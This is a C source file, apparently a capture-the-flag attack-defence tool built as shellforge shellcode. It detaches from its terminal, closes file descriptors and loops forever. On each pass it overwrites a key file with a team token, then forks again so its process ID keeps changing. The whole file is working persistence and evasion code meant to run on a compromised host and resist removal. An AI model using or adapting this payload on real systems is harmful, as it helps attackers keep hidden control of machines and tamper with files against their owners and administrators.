/*
 * To overwrite tokens forever
 *   by whats@wekk.net
 *
 * To be used with shellforge (or gcc)
 * $ gcc -D GCC foreverOverwrite.c -o foreverOverwrite
 *
 */

#ifdef GCC
#include <sys/ipc.h>
#include <sys/shm.h>
#include <sys/types.h>
#include <sys/sem.h>
#include <stdio.h>
#include <sys/stat.h>
#include <fcntl.h>
#endif

// Tuneable params
#define SECONDS_TO_WAIT 10
//#define SECONDS_TO_WAIT 60
#define FILE_PATH_TO_OPEN "/tmp/key"
//#define FILE_PATH_TO_OPEN "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
#define TEAM_TOKEN "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"

#define closeFds() \
	int m = 0; \
	for (m = 0; m < 100; m++) { \
		close(m); \
	}

#define writeKey(writeKey) \
	int fd = open(FILE_PATH_TO_OPEN, O_RDWR, 0); \
	write(fd, writeKey, 40); \
	close(fd);

int main()	{
    struct timespec ts;
	if (fork()) return 0;
	setsid();

	closeFds();

    ts.tv_sec = SECONDS_TO_WAIT;
	ts.tv_nsec = 0;

	while(1) {
		writeKey(TEAM_TOKEN);
		// Force it to change pid
		nanosleep(&ts, NULL);
		if (fork() > 0) return 0;
		setsid();
	}
}
